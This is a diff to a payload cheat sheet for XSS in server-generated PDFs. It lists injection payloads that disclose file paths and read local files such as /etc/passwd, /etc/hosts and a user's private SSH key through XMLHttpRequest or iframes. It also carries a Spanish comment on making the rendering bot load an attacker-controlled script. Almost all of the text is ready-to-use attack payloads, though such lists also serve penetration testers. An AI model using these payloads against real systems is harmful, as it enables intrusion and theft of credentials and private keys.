@@ -1,4 +1,4 @@
-# Local File Read via XSS in Dynamically Generated PDF - (comisariavirtual)
+# Local File Read and Exfiltrate Data via XSS from PDFs
 
 ```
 Discovery:
@@ -16,6 +16,7 @@ Path disclosure:
    1- <svg/onload=document.write(window.location)>
    2- <img src=x onerror=document.write(window.location)>
    3- <script>document.write(window.location)</script>
+   4- <script>document.write(document.location.href)</script>
 
 Load an external script:
    <!-- La mejor forma conforme para aprovechar esta vulnerabilidad es abusar de la vulnerabilidad para hacer que el bot cargue un script que controlas localmente. Luego, podrá cambiar la carga útil localmente y hacer que el bot lo cargue con el mismo código cada vez -->
@@ -24,6 +25,8 @@ Load an external script:
 
 Read local file:
    1- <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
-   2- <iframe src=file:///etc/passwd></iframe>
-   3- <img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
+   2- <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open('GET','file:///etc/hosts');x.send();</script>
+   3- <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
+   4- <iframe src=file:///etc/passwd></iframe>
+   5- <img src="x" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
 ```
